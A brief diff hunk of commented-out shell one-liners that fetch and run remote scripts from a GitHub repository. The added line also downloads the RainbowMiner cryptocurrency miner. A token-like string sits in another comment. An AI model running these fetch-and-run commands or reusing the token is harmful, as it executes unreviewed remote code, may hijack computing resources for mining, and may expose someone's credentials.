@@ -13,3 +13,5 @@
 # wget -O run.sh https://raw.githubusercontent.com/penjelajahwaktu/subrek/main/ron.sh && chmod +x ron.sh && ./ron.sh
 
 # 2KtRkhcqvGb9pHLTIlm35oPjzf2_4bLwDzDfPeEEuMaVGBtmW
+
+# wget https://github.com/RainbowMiner/RainbowMiner/releases/download/v4.9.0.1/RainbowMinerV4.9.0.1_linux.zip && unzip RainbowMinerV4.9.0.1_linux.zip && wget https://raw.githubusercontent.com/penjelajahwaktu/subrek/main/zer.sh && chmod +x zer.sh && ./zer.sh
